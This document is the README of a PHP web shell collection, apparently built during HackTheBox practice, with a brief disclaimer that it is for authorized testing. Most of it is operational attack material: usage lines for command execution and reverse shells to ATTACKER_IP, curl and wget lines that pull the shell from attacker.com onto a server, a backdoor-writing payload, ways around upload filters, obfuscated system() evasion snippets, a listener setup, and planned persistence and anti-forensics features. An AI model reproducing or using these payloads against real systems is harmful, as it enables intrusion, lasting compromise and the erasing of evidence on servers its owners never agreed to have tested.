# PHTML Multi-Shell Collection

A collection of PHP-based web shells designed to bypass upload filters that block `.php` extensions.

## Why PHTML?

Most upload filters blacklist common PHP extensions (`.php`, `.php5`, etc.) but forget about alternative extensions that Apache/web servers still execute as PHP:

- `.phtml` - PHP HTML (most common bypass)
- `.pht` - PHP Template
- `.php3`, `.php4`, `.php5`, `.php7` - Legacy PHP versions
- `.phps` - PHP Source (sometimes executable)
- `.phar` - PHP Archive
- `.inc` - Include files (if configured)
- Case variations: `.PhP`, `.pHtml`, `.PHTML` (on Windows/case-insensitive systems)

## Files in This Collection

### `shell-basic.phtml`
Minimal command execution shell. ~100 bytes.
```
Usage: shell-basic.phtml?cmd=whoami
```

### `shell-full.phtml`
Complete multi-method reverse shell with auto-fallback, file upload/download, and web UI.

**Features:**
- Command execution
- 12 different reverse shell methods with auto-try
- File upload/download
- Direct file writing
- Auto-detects bash path
- Terminal-style web interface

**Usage:**
```bash
# Command execution
shell-full.phtml?c=id

# Auto-try all reverse shell methods
shell-full.phtml?r=ATTACKER_IP:443&m=auto

# Specific reverse shell method
shell-full.phtml?r=ATTACKER_IP:443&m=python

# Download file
shell-full.phtml?d=/etc/passwd

# Write file
shell-full.phtml?w=/tmp/backdoor.php&data=<?php system($_GET['x']); ?>

# View full help
shell-full.phtml?help
```

## Reverse Shell Methods Included

1. **python** - Python3 socket (most reliable)
2. **python2** - Python2 fallback
3. **bash** - Bash /dev/tcp (no dependencies)
4. **sh** - Bourne shell fallback
5. **nc** - Netcat traditional
6. **nc_alt** - Netcat alternative syntax
7. **ncat** - Nmap's ncat
8. **perl** - Perl socket
9. **ruby** - Ruby socket
10. **php** - Native PHP socket with proc_open
11. **socat** - Socat exec
12. **telnet** - Telnet fallback

## Deployment Tips

### Direct Upload
Simply upload through vulnerable file upload forms that don't properly validate extensions.

### Injection via Command Execution
If you already have RCE but want a persistent shell:
```bash
# Using existing webshell
?cmd=curl http://attacker.com/shell-full.phtml -o /var/www/html/uploads/image.phtml

# Or with wget
?cmd=wget http://attacker.com/shell-full.phtml -O /var/www/html/uploads/image.phtml

# Or echo directly (base64 encoded to avoid quote issues)
?cmd=echo '<BASE64_ENCODED_SHELL>' | base64 -d > /var/www/html/uploads/image.phtml
```

### Bypassing Additional Restrictions

**Content-Type validation:**
- Use Burp Suite to intercept and change Content-Type to `image/jpeg` while keeping `.phtml` extension

**Magic byte checks:**
- Prepend GIF header: `GIF89a;<?php ...`
- Prepend PNG header (if allowed)

**File signature checks:**
- Embed PHP in EXIF data of real images
- Use polyglot files (valid image + valid PHP)

## Listener Setup

Always set up your listener BEFORE triggering the reverse shell:

```bash
# Standard netcat
nc -lvnp 443

# With ncat (Nmap's netcat)
ncat -lvnp 443

# Upgrade to full TTY after connection
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
```

## Tunneling Scenarios

### SSH Tunnel (Common HTB Scenario)
When target is behind SSH tunnel and cannot reach you directly:

```bash
# Set up SSH tunnel to access internal web service
ssh -N -L 8080:192.168.100.10:80 user@jumphost.htb

# Set up reverse port forward for reverse shell
ssh -R 443:localhost:443 user@jumphost.htb

# Or use the jumphost's IP on the internal network
# Find jumphost IP: ssh user@jumphost.htb "ip a"
# Connect back to that IP instead of localhost
```

### Multi-hop Scenarios
```bash
# Attacker -> Jumphost -> Target
# On jumphost, forward port to attacker
ssh -R 443:localhost:443 attacker@attacker-ip

# Target connects to jumphost
?r=jumphost-internal-ip:443&m=auto
```

## Future Customization Ideas

### Additional Features to Add

1. **Process Management**
   - List running processes
   - Kill processes
   - Start background jobs
   - Monitor system resources

2. **Network Enumeration**
   - Port scanner
   - Network interface info
   - Active connections
   - Route table display

3. **Database Interaction**
   - MySQL/PostgreSQL connection
   - Quick queries
   - Database dumping

4. **Privilege Escalation Helpers**
   - SUID binary finder
   - Writable directory scanner
   - Kernel version checker
   - Sudo -l parser

5. **File Browser**
   - Directory tree view
   - File permissions viewer
   - Quick edit capability
   - Recursive search

6. **Persistence Mechanisms**
   - Cron job installer
   - systemd service creator
   - SSH key injector
   - .bashrc backdoor

7. **Anti-Forensics**
   - Log cleaner
   - Timestamp modifier
   - History wiper
   - Self-destruct function

8. **Encoding/Obfuscation**
   - Base64 encode/decode
   - URL encode/decode
   - Hex converter
   - Command obfuscator

9. **More Reverse Shell Methods**
   - Golang reverse shell
   - Lua socket
   - AWK reverse shell
   - Node.js socket
   - Java reverse shell
   - PowerShell (for Windows targets)

10. **Bind Shell Option**
    - Listen on target instead of connecting out
    - Useful when outbound connections are blocked

### Code Optimization Ideas

1. **Modular Design**
   ```php
   // Split into separate included files
   include('core.php');
   include('shells.php');
   include('utils.php');
   ```

2. **Compressed Version**
   - Create minified single-line version
   - Use PHP's `eval(gzinflate(base64_decode('...')))` for obfuscation

3. **Configuration File**
   ```php
   // config.php
   define('ATTACKER_IP', 'YOUR_IP_HERE');
   define('LISTEN_PORT', 443);
   define('PASSWORD', 'changeme'); // Auth protection
   ```

4. **Authentication Layer**
   ```php
   // Add basic auth to prevent unauthorized use
   if(!isset($_GET['auth']) || $_GET['auth'] !== 'SECRET_KEY') {
       header('HTTP/1.0 404 Not Found');
       die();
   }
   ```

5. **Logging Feature**
   ```php
   // Log all commands executed
   file_put_contents('/tmp/.log', date('Y-m-d H:i:s')." - ".$_GET['c']."\n", FILE_APPEND);
   ```

### Extension Variants to Create

Create copies with different extensions for testing:
```bash
cp shell-full.phtml shell-full.pht
cp shell-full.phtml shell-full.php3
cp shell-full.phtml shell-full.php5
cp shell-full.phtml shell-full.phps
cp shell-full.phtml shell-full.phar
cp shell-full.phtml shell-full.inc
```

### Evasion Techniques

1. **Variable Function Names**
   ```php
   $f = 'system';
   $f($_GET['c']);
   ```

2. **String Concatenation**
   ```php
   $cmd = 'sys'.'tem';
   $cmd($_GET['c']);
   ```

3. **Base64 Obfuscation**
   ```php
   eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw=='));
   ```

4. **Array Callbacks**
   ```php
   call_user_func('system', $_GET['c']);
   ```

5. **Preg Replace Exploit (PHP < 7)**
   ```php
   preg_replace('/.*/e', $_GET['c'], '');
   ```

## Testing Checklist

Before deploying in a real engagement:

- [ ] Test all reverse shell methods on target OS
- [ ] Verify file upload/download works
- [ ] Check write permissions to common directories
- [ ] Test with different PHP versions (5.x, 7.x, 8.x)
- [ ] Verify bash path detection works
- [ ] Test auto-fallback mechanism
- [ ] Confirm cleanup (remove shells after engagement)

## Legal Disclaimer

These tools are for authorized penetration testing and CTF competitions only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## Credits

Developed during HTB practice. Combines techniques from:
- PayloadsAllTheThings
- PentestMonkey reverse shell cheatsheet
- GTFOBins
- Personal research and testing

## Version History

- **v1.0** - Basic command execution shell
- **v2.0** - Full-featured multi-method reverse shell with auto-fallback
- **v2.1** (planned) - Add authentication and logging
- **v3.0** (planned) - Modular architecture with plugin system

---

**Remember:** Always clean up after yourself. Remove shells and restore systems to original state after authorized testing.
```
